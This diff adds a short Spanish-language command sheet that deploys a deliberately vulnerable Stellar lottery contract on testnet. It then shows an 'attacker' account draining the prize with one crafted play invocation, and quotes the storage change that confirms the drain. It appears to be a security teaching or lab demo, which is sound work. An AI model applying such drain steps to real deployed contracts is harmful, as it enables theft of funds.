@@ -1,0 +1,15 @@
+Comandos
+stellar keys generate bob --network testnet --fund
+stellar keys address bob
+Cargo build
+curl "https://friendbot.stellar.org/?addr=<Dirección de Bob>"
+stellar contract deploy --wasm target\wasm32v1-none\release\lottery_vulnerable.optimized.wasm  --source-account bob --network testnet --alias lottery_vulnerable
+stellar contract invoke --id <DirecciónContrato> --source-account bob --network testnet -- initialize --owner <Dirección de Bob> --secret 42 --prize 1000
+stellar contract invoke --id <DirecciónContrato> --source-account bob --network testnet -- get_prize
+
+Atacante (carol)
+stellar keys generate carol --network testnet --fund
+stellar keys address carol
+Exploit
+stellar contract invoke --id  <DirecciónContrato> --source carol --network testnet -- play --player <Dirección de carol> --guess 99
+Detalle para saber si se drenó: Contract CCWA…2SSS updated persistent data ["Prize"sym] = 0i32 
